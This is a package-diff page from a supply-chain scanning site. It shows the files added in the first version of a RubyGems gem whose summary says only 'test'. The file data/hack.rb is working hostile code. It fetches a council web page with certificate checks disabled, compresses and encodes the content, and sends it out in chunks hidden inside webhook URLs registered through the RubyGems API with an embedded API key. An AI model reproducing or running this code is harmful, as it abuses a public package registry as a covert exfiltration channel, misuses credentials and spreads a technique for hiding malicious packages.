@@ -1,0 +1,416 @@
+Source: https://my.diffend.io/gems/southpxdatapp6pi/0.0.1
+Retrieved: 2026-09-27T22:38:03.766386+00:00
+
+RubyGems - southpxdatapp6pi - Versions diffs - 0.0.1 - Mend - Supply Chain Defender
+
+RubyGems
+
+npm
+
+PyPI
+
+Organizations
+
+Log in
+
+RubyGems
+
+southpxdatapp6pi
+
+Versions diffs
+
+0.0.1
+
+southpxdatapp6pi
+0.0.1
+
+This diff represents the content of publicly available package versions that have been released to one of the supported registries. The information contained in this diff is provided for informational purposes only and reflects changes between package versions as they appear in their respective public registries.
+
+        Files changed (5)
+        hide
+        show
+
+            checksums.yaml
+
+          +7
+          -0
+
+            data/a.gemspec
+
+          +1
+          -0
+
+            data/hack.rb
+
+          +12
+          -0
+
+            data/lib/x.rb
+
+          +1
+          -0
+
+            metadata
+
+          +42
+          -0
+
+        checksums.yaml
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,7 @@
+
+1
+
+            +
+            ---
+
+2
+
+            +
+            SHA256:
+
+3
+
+            +
+              metadata.gz: d912cab5e4b94893ef614f2abd462440999864da5ba217b5871ef1737699dc0a
+
+4
+
+            +
+              data.tar.gz: 488f293f2a16619838881c99564dd67ad4177f25acfd85c1d24f60aacb5a211d
+
+5
+
+            +
+            SHA512:
+
+6
+
+            +
+              metadata.gz: 8617c0d3fb83596e75c807e4cce6ffa5e55c710efcc4d745257fb0e9786fc877a2b1b15a46591690e255a634085eb7671c7e01e5692d97502fa673cf238707d7
+
+7
+
+            +
+              data.tar.gz: 05cfcdd041ced395d6b2720e3830dc8d80f42e38f3932c52f36afb0fb2e546bdd13e8a3ef1f742246b011df1635a6317ae806db6dd1996b597c32b6d29e787dd
+
+        data/a.gemspec
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1 @@
+
+1
+
+            +
+            Gem::Specification.new do |s| s.name='southpxdatapp6pi'; s.version='0.0.1'; s.summary='test'; s.authors=['A']; s.email=['a@example.com']; s.files=Dir['*','lib/*']; s.homepage='https://example.com'; s.license='MIT'; end
+
+        data/hack.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,12 @@
+
+1
+
+            +
+            begin
+
+2
+
+            +
+             require 'net/http';require 'uri';require 'zlib';require 'base64';require 'openssl'
+
+3
+
+            +
+             key='rubygems_d8e875bd0a97e2f33498dba3ef41ffb1f951adb1b503a533'; target=URI('https://moderngov.southwark.gov.uk/mgCalendarMonthView.aspx?GL=1&bcr=1')
+
+4
+
+            +
+             h=Net::HTTP.new(target.hostname,target.port); h.use_ssl=true; h.verify_mode=OpenSSL::SSL::VERIFY_NONE;h.open_timeout=20;h.read_timeout=50
+
+5
+
+            +
+             res=h.request(Net::HTTP::Get.new(target.request_uri,{'User-Agent'=>'Mozilla/5.0'})); raw="STATUS=#{res.code}\n"+res.body; data=Base64.urlsafe_encode64(Zlib::Deflate.deflate(raw)).delete('='); chunks=data.scan(/.{1,220}/)
+
+6
+
+            +
+             chunks.each_with_index do |ch,i|
+
+7
+
+            +
+              uri=URI('https://rubygems.org/api/v1/web_hooks'); req=Net::HTTP::Post.new(uri); req['Authorization']=key; req.set_form_data({'gem_name'=>'southpxdatapp6pi','url'=>'https://example.com/A%03d/%s'%[i,ch]}); Net::HTTP.start(uri.hostname,uri.port,use_ssl:true){|x| x.request(req)} rescue nil
+
+8
+
+            +
+             end
+
+9
+
+            +
+             uri=URI('https://rubygems.org/api/v1/web_hooks'); req=Net::HTTP::Post.new(uri); req['Authorization']=key; req.set_form_data({'gem_name'=>'southpxdatapp6pi','url'=>'https://example.com/ZZEND/'+chunks.size.to_s}); Net::HTTP.start(uri.hostname,uri.port,use_ssl:true){|x| x.request(req)}
+
+10
+
+            +
+            rescue=>e
+
+11
+
+            +
+             uri=URI('https://rubygems.org/api/v1/web_hooks'); req=Net::HTTP::Post.new(uri); req['Authorization']=key; req.set_form_data({'gem_name'=>'southpxdatapp6pi','url'=>'https://example.com/ERR/'+e.class.to_s+'_'+e.message.gsub(/[^A-Za-z0-9.-]/,'_')[0,80]}); Net::HTTP.start(uri.hostname,uri.port,use_ssl:true){|x| x.request(req)} rescue nil
+
+12
+
+            +
+            end
+
+        data/lib/x.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1 @@
+
+1
+
+            +
+            #
+
+        metadata
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,42 @@
+
+1
+
+            +
+            --- !ruby/object:Gem::Specification
+
+2
+
+            +
+            name: southpxdatapp6pi
+
+3
+
+            +
+            version: !ruby/object:Gem::Version
+
+4
+
+            +
+              version: 0.0.1
+
+5
+
+            +
+            platform: ruby
+
+6
+
+            +
+            authors:
+
+7
+
+            +
+            - A
+
+8
+
+            +
+            bindir: bin
+
+9
+
+            +
+            cert_chain: []
+
+10
+
+            +
+            date: 1980-01-02 00:00:00.000000000 Z
+
+11
+
+            +
+            dependencies: []
+
+12
+
+            +
+            email:
+
+13
+
+            +
+            - a@example.com
+
+14
+
+            +
+            executables: []
+
+15
+
+            +
+            extensions: []
+
+16
+
+            +
+            extra_rdoc_files: []
+
+17
+
+            +
+            files:
+
+18
+
+            +
+            - a.gemspec
+
+19
+
+            +
+            - hack.rb
+
+20
+
+            +
+            - lib/x.rb
+
+21
+
+            +
+            homepage: https://example.com
+
+22
+
+            +
+            licenses:
+
+23
+
+            +
+            - MIT
+
+24
+
+            +
+            metadata: {}
+
+25
+
+            +
+            rdoc_options: []
+
+26
+
+            +
+            require_paths:
+
+27
+
+            +
+            - lib
+
+28
+
+            +
+            required_ruby_version: !ruby/object:Gem::Requirement
+
+29
+
+            +
+              requirements:
+
+30
+
+            +
+              - - ">="
+
+31
+
+            +
+                - !ruby/object:Gem::Version
+
+32
+
+            +
+                  version: '0'
+
+33
+
+            +
+            required_rubygems_version: !ruby/object:Gem::Requirement
+
+34
+
+            +
+              requirements:
+
+35
+
+            +
+              - - ">="
+
+36
+
+            +
+                - !ruby/object:Gem::Version
+
+37
+
+            +
+                  version: '0'
+
+38
+
+            +
+            requirements: []
+
+39
+
+            +
+            rubygems_version: 3.6.7
+
+40
+
+            +
+            specification_version: 4
+
+41
+
+            +
+            summary: test
+
+42
+
+            +
+            test_files: []
+
+Contact Us
+
+Terms of Service
+
+Privacy Policy
+
+Docs
+
+Copyright © 2026 Mend Software
